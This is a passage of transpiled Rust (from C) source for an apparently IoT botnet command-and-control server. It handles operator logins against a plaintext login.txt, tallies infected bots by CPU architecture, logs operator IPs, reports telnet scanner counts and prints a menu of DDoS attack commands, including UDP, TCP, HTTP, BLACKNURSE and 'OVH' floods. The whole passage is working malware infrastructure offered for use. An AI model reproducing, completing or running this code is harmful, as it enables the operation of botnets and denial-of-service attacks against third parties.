            string.as_mut_ptr() as *const libc::c_void,
            strlen(string.as_mut_ptr()),
            MSG_NOSIGNAL as libc::c_int,
        ) == -(1 as libc::c_int) as libc::c_long
        {
            return;
        }
        sleep(2 as libc::c_int as libc::c_uint);
    };
}
#[no_mangle]
pub unsafe extern "C" fn Find_Login(mut str: *mut libc::c_char) -> libc::c_int {
    let mut fp: *mut FILE = 0 as *mut FILE;
    let mut line_num: libc::c_int = 0 as libc::c_int;
    let mut find_result: libc::c_int = 0 as libc::c_int;
    let mut find_line: libc::c_int = 0 as libc::c_int;
    let mut temp: [libc::c_char; 512] = [0; 512];
    fp = fopen(
        b"login.txt\0" as *const u8 as *const libc::c_char,
        b"r\0" as *const u8 as *const libc::c_char,
    );
    if fp.is_null() {
        return -(1 as libc::c_int);
    }
    while !(fgets(temp.as_mut_ptr(), 512 as libc::c_int, fp)).is_null() {
        if !(strstr(temp.as_mut_ptr(), str)).is_null() {
            find_result += 1;
            find_line = line_num;
        }
        line_num += 1;
    }
    if !fp.is_null() {
        fclose(fp);
    }
    if find_result == 0 as libc::c_int {
        return 0 as libc::c_int;
    }
    return find_line;
}
#[no_mangle]
pub unsafe extern "C" fn countArch() {
    let mut x: libc::c_int = 0;
    ppc = 0 as libc::c_int;
    sh4 = 0 as libc::c_int;
    x86 = 0 as libc::c_int;
    armv3 = 0 as libc::c_int;
    armv4t = 0 as libc::c_int;
    armv6 = 0 as libc::c_int;
    armv7 = 0 as libc::c_int;
    mips = 0 as libc::c_int;
    m68k = 0 as libc::c_int;
    ppc = 0 as libc::c_int;
    sparc = 0 as libc::c_int;
    mipsel = 0 as libc::c_int;
    unknown = 0 as libc::c_int;
    x = 0 as libc::c_int;
    while x < 100000 as libc::c_int {
        if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"ppc\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            ppc += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"SH4\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            sh4 += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"x86_\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            x86 += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"ARM3\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            armv3 += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"ARM4T\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            armv4t += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"ARM6\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            armv6 += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"ARM7\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            armv7 += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"MIPSEL\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            || !(strstr(
                (clients[x as usize].arch).as_mut_ptr(),
                b"mipsel\0" as *const u8 as *const libc::c_char,
            ))
                .is_null()
                && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            mipsel += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"MIPS\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            mips += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"M68K\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            m68k += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"POWERPC\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            ppc += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"SPARC\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            sparc += 1;
        } else if !(strstr(
            (clients[x as usize].arch).as_mut_ptr(),
            b"unknown\0" as *const u8 as *const libc::c_char,
        ))
            .is_null()
            && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
            || (clients[x as usize].arch).as_mut_ptr().is_null()
                && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
            || strlen((clients[x as usize].arch).as_mut_ptr())
                <= 0 as libc::c_int as libc::c_ulong
                && clients[x as usize].connected as libc::c_int == 1 as libc::c_int
        {
            unknown += 1;
        }
        x += 1;
    }
}
#[no_mangle]
pub unsafe extern "C" fn BotWorker(mut sock: *mut libc::c_void) {
    let mut failed_line1: [libc::c_char; 80] = [0; 80];
    let mut ok: libc::c_int = 0;
    let mut nickstring: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut welcome_line: [libc::c_char; 80] = [0; 80];
    let mut banner_bot_count: [libc::c_char; 2048] = [0; 2048];
    let mut client_logs: *mut FILE = 0 as *mut FILE;
    let mut current_block: u64;
    let mut args: *mut kekl = sock as *mut kekl;
    let mut datafd: libc::c_int = (*args).sock;
    let mut management_ip: *const libc::c_char = get_host((*args).ip);
    let mut find_line: libc::c_int = 0;
    ::std::ptr::write_volatile(
        &mut OperatorsConnected as *mut libc::c_int,
        ::std::ptr::read_volatile::<
            libc::c_int,
        >(&OperatorsConnected as *const libc::c_int) + 1,
    );
    let mut title: pthread_t = 0;
    let mut buf: [libc::c_char; 2048] = [0; 2048];
    let mut username: *mut libc::c_char = 0 as *mut libc::c_char;
    let mut password: *mut libc::c_char = 0 as *mut libc::c_char;
    memset(
        buf.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        ::std::mem::size_of::<[libc::c_char; 2048]>() as libc::c_ulong,
    );
    let mut botnet: [libc::c_char; 2048] = [0; 2048];
    memset(
        botnet.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        2048 as libc::c_int as libc::c_ulong,
    );
    let mut botcount: [libc::c_char; 2048] = [0; 2048];
    memset(
        botcount.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        2048 as libc::c_int as libc::c_ulong,
    );
    let mut statuscount: [libc::c_char; 2048] = [0; 2048];
    memset(
        statuscount.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        2048 as libc::c_int as libc::c_ulong,
    );
    let mut fp: *mut FILE = 0 as *mut FILE;
    let mut i: libc::c_int = 0 as libc::c_int;
    let mut c: libc::c_int = 0;
    fp = fopen(
        b"login.txt\0" as *const u8 as *const libc::c_char,
        b"r\0" as *const u8 as *const libc::c_char,
    );
    while feof(fp) == 0 {
        c = fgetc(fp);
        i += 1;
    }
    let mut j: libc::c_int = 0 as libc::c_int;
    rewind(fp);
    while j != i - 1 as libc::c_int {
        fscanf(
            fp,
            b"%s %s\0" as *const u8 as *const libc::c_char,
            (accounts[j as usize].username).as_mut_ptr(),
            (accounts[j as usize].password).as_mut_ptr(),
        );
        j += 1;
    }
    sprintf(
        botnet.as_mut_ptr(),
        b"\x1B[31mUsername\x1B[97m: \0" as *const u8 as *const libc::c_char,
    );
    if !(send(
        datafd,
        botnet.as_mut_ptr() as *const libc::c_void,
        strlen(botnet.as_mut_ptr()),
        MSG_NOSIGNAL as libc::c_int,
    ) == -(1 as libc::c_int) as libc::c_long)
    {
        if !(fdgets(
            buf.as_mut_ptr() as *mut libc::c_uchar,
            ::std::mem::size_of::<[libc::c_char; 2048]>() as libc::c_ulong
                as libc::c_int,
            datafd,
        ) < 1 as libc::c_int)
        {
            trim(buf.as_mut_ptr());
            nickstring = 0 as *mut libc::c_char;
            nickstring = buf.as_mut_ptr();
            find_line = Find_Login(nickstring);
            if strcmp(nickstring, (accounts[find_line as usize].username).as_mut_ptr())
                == 0 as libc::c_int
            {
                snprintf(
                    (managements[datafd as usize].username).as_mut_ptr(),
                    ::std::mem::size_of::<[libc::c_char; 50]>() as libc::c_ulong,
                    b"%s\0" as *const u8 as *const libc::c_char,
                    buf.as_mut_ptr(),
                );
                snprintf(
                    (managements[datafd as usize].userprompt).as_mut_ptr(),
                    ::std::mem::size_of::<[libc::c_char; 1024]>() as libc::c_ulong,
                    b"\x1B[31m%s:\x1B[31m\0" as *const u8 as *const libc::c_char,
                    (managements[datafd as usize].username).as_mut_ptr(),
                );
                memset(
                    buf.as_mut_ptr() as *mut libc::c_void,
                    0 as libc::c_int,
                    ::std::mem::size_of::<[libc::c_char; 2048]>() as libc::c_ulong,
                );
                sprintf(
                    botnet.as_mut_ptr(),
                    b"\x1B[31mPassword\x1B[97m: \x1B[30m\0" as *const u8
                        as *const libc::c_char,
                );
                if send(
                    datafd,
                    botnet.as_mut_ptr() as *const libc::c_void,
                    strlen(botnet.as_mut_ptr()),
                    MSG_NOSIGNAL as libc::c_int,
                ) == -(1 as libc::c_int) as libc::c_long
                {
                    current_block = 5005401933950163426;
                } else if fdgets(
                    buf.as_mut_ptr() as *mut libc::c_uchar,
                    ::std::mem::size_of::<[libc::c_char; 2048]>() as libc::c_ulong
                        as libc::c_int,
                    datafd,
                ) < 1 as libc::c_int
                {
                    current_block = 5005401933950163426;
                } else {
                    trim(buf.as_mut_ptr());
                    if strcmp(
                        buf.as_mut_ptr(),
                        (accounts[find_line as usize].password).as_mut_ptr(),
                    ) != 0 as libc::c_int
                    {
                        current_block = 340123238355120661;
                    } else {
                        memset(
                            buf.as_mut_ptr() as *mut libc::c_void,
                            0 as libc::c_int,
                            2048 as libc::c_int as libc::c_ulong,
                        );
                        pthread_create(
                            &mut title,
                            0 as *const pthread_attr_t,
                            ::std::mem::transmute::<
                                Option::<unsafe extern "C" fn(*mut libc::c_void) -> ()>,
                                Option::<
                                    unsafe extern "C" fn(*mut libc::c_void) -> *mut libc::c_void,
                                >,
                            >(
                                Some(
                                    TitleWriter as unsafe extern "C" fn(*mut libc::c_void) -> (),
                                ),
                            ),
                            datafd as *mut libc::c_void,
                        );
                        welcome_line = [0; 80];
                        banner_bot_count = [0; 2048];
                        memset(
                            banner_bot_count.as_mut_ptr() as *mut libc::c_void,
                            0 as libc::c_int,
                            2048 as libc::c_int as libc::c_ulong,
                        );
                        sprintf(
                            welcome_line.as_mut_ptr(),
                            b"\x1B[37m        #\x1B[36m----- \x1B[37mBot Count: %d\x1B[36m -----\x1B[37m#\r\n\0"
                                as *const u8 as *const libc::c_char,
                            BotsConnected(),
                            OperatorsConnected,
                        );
                        sprintf(
                            banner_bot_count.as_mut_ptr(),
                            b"\r\n\x1B[37m    #\x1B[36m-------- \x1B[37mWelcome, %s\x1B[36m --------\x1B[37m#\r\n\0"
                                as *const u8 as *const libc::c_char,
                            (accounts[find_line as usize].username).as_mut_ptr(),
                        );
                        if send(
                            datafd,
                            welcome_line.as_mut_ptr() as *const libc::c_void,
                            strlen(welcome_line.as_mut_ptr()),
                            MSG_NOSIGNAL as libc::c_int,
                        ) == -(1 as libc::c_int) as libc::c_long
                        {
                            current_block = 5005401933950163426;
                        } else if send(
                            datafd,
                            (managements[datafd as usize].userprompt).as_mut_ptr()
                                as *const libc::c_void,
                            strlen(
                                (managements[datafd as usize].userprompt).as_mut_ptr(),
                            ),
                            MSG_NOSIGNAL as libc::c_int,
                        ) == -(1 as libc::c_int) as libc::c_long
                        {
                            current_block = 5005401933950163426;
                        } else {
                            managements[datafd as usize].connected = 1 as libc::c_int;
                            managements[datafd as usize].mute = 0 as libc::c_int;
                            snprintf(
                                (managements[datafd as usize].ip).as_mut_ptr(),
                                ::std::mem::size_of::<[libc::c_char; 16]>()
                                    as libc::c_ulong,
                                b"%s\0" as *const u8 as *const libc::c_char,
                                management_ip,
                            );
                            printf(
                                b"\x1B[35m%s\x1B[31m:\x1B[36m%s\x1B[32m logged in\x1B[37m.\n\0"
                                    as *const u8 as *const libc::c_char,
                                (managements[datafd as usize].username).as_mut_ptr(),
                                (managements[datafd as usize].ip).as_mut_ptr(),
                            );
                            client_logs = 0 as *mut FILE;
                            client_logs = fopen(
                                b"clients.txt\0" as *const u8 as *const libc::c_char,
                                b"a\0" as *const u8 as *const libc::c_char,
                            );
                            if client_logs.is_null() {
                                client_logs = fopen(
                                    b"clients.txt\0" as *const u8 as *const libc::c_char,
                                    b"w\0" as *const u8 as *const libc::c_char,
                                );
                            }
                            fprintf(
                                client_logs,
                                b"%s:%s\n\0" as *const u8 as *const libc::c_char,
                                (managements[datafd as usize].username).as_mut_ptr(),
                                (managements[datafd as usize].ip).as_mut_ptr(),
                            );
                            fclose(client_logs);
                            's_298: while fdgets(
                                buf.as_mut_ptr() as *mut libc::c_uchar,
                                ::std::mem::size_of::<[libc::c_char; 2048]>()
                                    as libc::c_ulong as libc::c_int,
                                datafd,
                            ) > 0 as libc::c_int
                            {
                                if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"bots\0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                {
                                    countArch();
                                    if BotsConnected() == 0 as libc::c_int as libc::c_uint {
                                        sprintf(
                                            botnet.as_mut_ptr(),
                                            b"\x1B[1;36musers [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                as *const u8 as *const libc::c_char,
                                            OperatorsConnected,
                                        );
                                        if send(
                                            datafd,
                                            botnet.as_mut_ptr() as *const libc::c_void,
                                            strlen(botnet.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            return;
                                        }
                                    } else {
                                        sprintf(
                                            botnet.as_mut_ptr(),
                                            b"\x1B[1;36mUsers [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                as *const u8 as *const libc::c_char,
                                            OperatorsConnected,
                                        );
                                        if send(
                                            datafd,
                                            botnet.as_mut_ptr() as *const libc::c_void,
                                            strlen(botnet.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            return;
                                        }
                                        if ppc != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36mpowerpc [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                ppc,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if sh4 != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36msh4 [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                sh4,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if x86 != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36mx86 [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                x86,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if armv3 != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36marm3 [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                armv3,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if armv4t != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36marm4t [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                armv4t,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if armv6 != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36marm6 [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                armv6,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if armv7 != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36marm7 [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                armv7,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if mips != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36mmips [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                mips,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if m68k != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36mm68k [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                m68k,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if sparc != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36msparc [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                sparc,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if mipsel != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36mmipsel [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                mipsel,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        if unknown != 0 as libc::c_int {
                                            sprintf(
                                                botnet.as_mut_ptr(),
                                                b"\x1B[1;36munknown [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                    as *const u8 as *const libc::c_char,
                                                unknown,
                                            );
                                            if send(
                                                datafd,
                                                botnet.as_mut_ptr() as *const libc::c_void,
                                                strlen(botnet.as_mut_ptr()),
                                                MSG_NOSIGNAL as libc::c_int,
                                            ) == -(1 as libc::c_int) as libc::c_long
                                            {
                                                return;
                                            }
                                        }
                                        sprintf(
                                            botnet.as_mut_ptr(),
                                            b"\x1B[1;36mTotal: [\x1B[0m%d\x1B[1;36m]\r\n\x1B[0m\0"
                                                as *const u8 as *const libc::c_char,
                                            BotsConnected(),
                                        );
                                        if send(
                                            datafd,
                                            botnet.as_mut_ptr() as *const libc::c_void,
                                            strlen(botnet.as_mut_ptr()),
                                            MSG_NOSIGNAL as libc::c_int,
                                        ) == -(1 as libc::c_int) as libc::c_long
                                        {
                                            return;
                                        }
                                    }
                                } else if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"stat\0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                {
                                    sprintf(
                                        statuscount.as_mut_ptr(),
                                        b"TELNET DEVICES: %d  TELNET STATUS: %d\r\n\0" as *const u8
                                            as *const libc::c_char,
                                        TELFound,
                                        scannerreport,
                                    );
                                    if send(
                                        datafd,
                                        statuscount.as_mut_ptr() as *const libc::c_void,
                                        strlen(statuscount.as_mut_ptr()),
                                        MSG_NOSIGNAL as libc::c_int,
                                    ) == -(1 as libc::c_int) as libc::c_long
                                    {
                                        return;
                                    }
                                } else if !(strstr(
                                    buf.as_mut_ptr(),
                                    b"HELP\0" as *const u8 as *const libc::c_char,
                                ))
                                    .is_null()
                                    || !(strstr(
                                        buf.as_mut_ptr(),
                                        b"help\0" as *const u8 as *const libc::c_char,
                                    ))
                                        .is_null()
                                    || !(strstr(
                                        buf.as_mut_ptr(),
                                        b"?\0" as *const u8 as *const libc::c_char,
                                    ))
                                        .is_null()
                                {
                                    let mut ddosline1: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline2: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline3: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline4: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline5: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline6: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline7: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline8: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline9: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline10: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline11: [libc::c_char; 150] = [0; 150];
                                    let mut ddosline12: [libc::c_char; 150] = [0; 150];
                                    sprintf(
                                        ddosline1.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x94\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x97\x1B[37m\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline2.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x91  [!] Attack Commands                                                               \xE2\x95\x91\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline3.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x91  [+]   UDP Flood:  UDP  [IP] [PORT] [TIME]                                         \xE2\x95\x91\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline4.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x91  [+]   STD Flood:  STD  [IP] [PORT] [TIME]                                         \xE2\x95\x91\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline5.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x91  [+]   TCP Flood:  TCP  [IP] [PORT] [TIME] [FLAGS/ALL/SYN/ACK/URG/XMAS/ETC] [SIZE] \xE2\x95\x91\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline6.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x91  [+]   JUNK Flood: JUNK [IP] [PORT] [TIME]                                         \xE2\x95\x91\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline7.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x91  [+]   HOLD Flood: HOLD [IP] [PORT] [TIME]                                         \xE2\x95\x91\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline8.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x91  [+]   BLACKNURSE Flood: BLACKNURSE [IP] [TIME]                                    \xE2\x95\x91\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline9.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x91  [+]   HTTP Flood: HTTP [METHOD] [TARGET] [PORT] / [TIME] [POWER]                  \xE2\x95\x91\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline10.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x91  [+]   HTTP Hex: HTTPHEX [METHOD] [TARGET] [PORT] / [TIME] [POWER]                 \xE2\x95\x91\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline11.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x91  [+]   OVH UDP RAPE FLOOD:  OVH [IP] [PORT] [SIZE] [TIME] [FORKS]                  \xE2\x95\x91\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    sprintf(
                                        ddosline12.as_mut_ptr(),
                                        b"\x1B[37m  \xE2\x95\x9A\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x90\xE2\x95\x9D\r\n\0"
                                            as *const u8 as *const libc::c_char,
                                    );
                                    if send(
                                        datafd,
                                        ddosline1.as_mut_ptr() as *const libc::c_void,
